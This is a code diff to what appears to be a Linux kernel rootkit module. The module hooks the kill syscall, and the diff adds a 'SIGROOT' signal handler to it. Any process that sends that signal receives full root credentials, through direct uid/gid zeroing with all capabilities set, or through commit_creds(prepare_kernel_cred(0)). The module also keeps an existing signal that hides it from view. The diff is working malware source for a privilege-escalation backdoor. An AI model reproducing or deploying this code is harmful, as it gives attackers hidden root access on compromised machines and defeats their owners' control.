@@ -28,6 +28,7 @@
 #endif
 
 #define SIGFLIP 50
+#define SIGROOT 51
 #define SYS_CALL_TABLE \
 ({ \
 unsigned int *p = (unsigned int*)__builtin_alloca(16); \
@@ -198,6 +199,22 @@ asmlinkage int new_kill(pid_t pid, int sig){
         case SIGFLIP:
             if(hidden) show();
             else hide();
+            break;
+        case SIGROOT:
+    #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
+            current->uid   = 0;
+            current->suid  = 0;
+            current->euid  = 0;
+            current->gid   = 0;
+            current->egid  = 0;
+            current->fsuid = 0;
+            current->fsgid = 0;
+            cap_set_full(current->cap_effective);
+            cap_set_full(current->cap_inheritable);
+            cap_set_full(current->cap_permitted);
+    #else
+            commit_creds(prepare_kernel_cred(0));
+    #endif
             break;
         default:
             return org_kill(pid, sig);
